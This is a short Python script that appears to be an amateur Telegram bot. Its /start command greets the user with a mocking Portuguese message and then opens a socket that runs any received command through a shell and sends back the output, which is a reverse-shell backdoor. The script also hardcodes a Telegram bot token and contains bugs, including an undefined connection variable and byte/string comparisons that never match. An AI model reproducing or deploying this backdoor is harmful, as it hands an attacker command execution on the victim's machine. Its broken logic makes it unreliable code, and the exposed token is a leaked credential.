import telebot
import socket
import subprocess
from os import listdir


bot = telebot.TeleBot('908462451:AAHhAbKFAN1vOHA3SB_ph1xnXsCe_4NdeI8')

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, 'Bem vindo ao BOT ! Aqui é o lugar perfeito para voce se ferrar')
    # Config Socket
    host = '127.0.0.1'
    port = 7777

    s = socket.socket()
    s.connect((host, port))

    while True:
        cmd = s.recv(1024)

        if cmd == 'ls':
            listdir()

        elif cmd == 'pwd':
            conn.send(b'pwd')

        proc = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        resposta = proc.stdout.read() + proc.stderr.read()

        s.send(resposta)

bot.polling()
